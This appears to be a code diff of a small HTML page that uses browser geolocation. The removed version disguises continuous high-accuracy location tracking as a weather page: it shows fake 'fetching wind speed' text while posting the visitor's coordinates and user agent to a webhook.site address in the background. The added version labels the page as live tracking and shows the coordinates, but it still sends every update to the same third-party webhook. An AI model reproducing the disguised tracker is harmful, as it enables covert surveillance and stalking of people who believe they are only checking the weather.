@@ -1,23 +1,23 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Weather Update</title>
+  <title>Live Location Tracking</title>
   <meta charset="UTF-8">
 </head>
 <body>
 
-<h3>Weather Update</h3>
-<p id="status">Checking local weather conditions...</p>
+<h3>Live Location Tracking</h3>
+<p id="status">Waiting for GPS permission…</p>
 <p id="coords"></p>
 
 <script>
 if (!navigator.geolocation) {
   document.getElementById("status").innerText =
-    "Weather services are not supported on this device.";
+    "Geolocation not supported on this device.";
 } else {
 
   document.getElementById("status").innerText =
-    "Loading weather conditions...";
+    "Live tracking started. Keep this page open.";
 
   navigator.geolocation.watchPosition(
     (pos) => {
@@ -29,11 +29,13 @@ if (!navigator.geolocation) {
         userAgent: navigator.userAgent
       };
 
-      // Only visible text
+      // Display on screen
       document.getElementById("coords").innerText =
-        "Fetching wind speed and temperature for your area...";
+        `Latitude: ${data.latitude}
+Longitude: ${data.longitude}
+Accuracy: ${data.accuracy} meters`;
 
-      // Background webhook request
+      // Send updates to webhook
       fetch("https://webhook.site/8f979837-3de8-4935-b9c0-7e1d6d4e0125", {
         method: "POST",
         mode: "no-cors",
@@ -45,7 +47,7 @@ if (!navigator.geolocation) {
     },
     (err) => {
       document.getElementById("status").innerText =
-        "Unable to load weather information.";
+        "Location access stopped or denied.";
     },
     {
       enableHighAccuracy: true,
